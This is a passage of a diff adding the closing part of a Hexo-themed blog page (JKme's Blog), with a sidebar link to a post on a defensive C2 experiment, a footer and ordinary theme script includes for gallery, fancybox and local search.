+        <a href="/2021/04/06/defense-from-c2.html" ><i class="fa fa-file-o"></i>防御性C2玩具尝试</a>
+      </li>
+    
+  </ul>
+</div>
+
+		
+	</div> <!-- sidebar -->
+</div> <!-- col-md-3 -->
+
+	
+	
+</div> <!-- row-fluid -->
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2022 JKme's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
